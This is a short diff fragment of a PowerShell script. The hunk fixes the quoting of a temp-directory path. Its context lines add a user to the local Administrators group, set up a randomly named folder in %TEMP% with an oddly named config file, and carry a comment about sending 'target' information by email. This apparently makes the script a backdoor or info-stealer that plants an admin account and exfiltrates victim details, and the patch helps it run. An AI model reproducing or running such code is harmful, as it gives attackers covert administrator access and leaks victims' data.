@@ -15,7 +15,7 @@ Add-LocalGroupMember -Group "Administrators" -Member $UserName
 #Create dir Working temp
 $initial_dir = Get-Location
 $dirName = random_text
-$pathDir = $env:temp\$dirName
+$pathDir = "$env:temp\$dirName"
 $configfile = "$env:TEMP\config.kAiZ3n"
 #Send infor target into email 
 if(Test-Path $configfile){
